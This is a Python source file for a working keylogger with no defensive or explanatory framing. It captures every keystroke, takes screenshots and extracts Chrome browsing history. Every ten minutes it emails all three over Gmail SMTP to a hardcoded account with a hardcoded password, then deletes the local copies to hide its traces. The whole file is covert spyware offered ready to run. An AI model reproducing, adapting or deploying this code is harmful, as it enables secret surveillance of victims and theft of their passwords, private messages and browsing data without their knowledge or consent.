import keyboard
import smtplib, imghdr, time, pyautogui
from threading import Timer, Semaphore
import winreg as reg  
import os
from email.message import EmailMessage
import browserhistory as bh
import csv

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from os.path import basename

class Keylogger:
    # Interval is how many seconds before sending email
    # Log is the log of keystrokes
    # lock is to block thread
    def __init__(self, interval):
        self.interval = interval
        self.log=''
        self.screenshots = ''
        self.lock = Semaphore(0)

    def callback(self, event):
        # name is the current keystroke registered
        name = event.name
        if len(name) > 1:
            if name == 'space':
                name = ' '
                if name == 'decimal':
                    name = '.'
        # Add current keystroke to log file
        self.log += name
        

    def sendmail(self, email, password, keylogs):
        # Screenshot sending - Setting email up
        newMessage = EmailMessage()                         
        newMessage['Subject'] = "" 
        newMessage['From'] = email                  
        newMessage['To'] = email     
        # Take Screenshot and add to email             
        pyautogui.screenshot().save("screenshot.png")
        with open('screenshot.png', 'rb') as f:
            image_data = f.read()
            image_type = imghdr.what(f.name)
            image_name = f.name
        newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)
        # Write down all keylogs in a txt file
        with open("logs.txt","w") as logs:
            logs.write(keylogs)
        # Set up email, attach txt file to email
        msg2 = MIMEMultipart()
        msg2['From'] = email
        msg2['To'] = email
        msg2['Subject'] = ""
        filename='logs.txt'
        file=open(filename, "rb")
        fileBaseName = basename(filename)
        part = MIMEApplication(file.read(), Name = fileBaseName)
        part.add_header('Content-Disposition', 'attachment; filename="' + fileBaseName + '"')
        msg2.attach(part)
        # Write down internet history into a csv file
        try:
            dict_obj = bh.get_browserhistory()
            dict_obj.keys()
            with open("hist.csv",'w') as wr:
                csvwr = csv.writer(wr)
                csvwr.writerow(['URL',"TITLE","TIME"])
                for i in range(len(dict_obj['chrome'])):
                    print(i)
                    try:
                        csvwr.writerow(dict_obj['chrome'][i])
                    # If history record contains non english characters skip it
                    except:
                        continue
            # Attach internet history to email
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = email
            msg['Subject'] = ""
            filename='hist.csv'
            file=open(filename, "rb")
            fileBaseName = basename(filename)
            part = MIMEApplication(file.read(), Name = fileBaseName)
            part.add_header('Content-Disposition', 'attachment; filename="' + fileBaseName + '"')
            msg.attach(part)
            # Send email
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(email, password)              
                smtp.send_message(msg)
                smtp.send_message(newMessage)
                smtp.send_message(msg2)
            # Delete files from PC until next usage
            os.system("del screenshot.png")
            os.system("del logs.txt")
            os.system("del hist.csv")
        except:
            pass

    def report(self):
        # Send log file if there's any content in it and then reset its contents
        if self.log:
            self.sendmail('timetablelimited@gmail.com', "AUTH%^&567", self.log)
        self.log=''
        
        print(self.report)
        # Run the report function every (interval) seconds
        Timer(interval=self.interval, function=self.report).start()


    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        # block the current thread,
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.lock.acquire()

if __name__ == '__main__': 
    keylogger = Keylogger(interval=600)
    keylogger.start()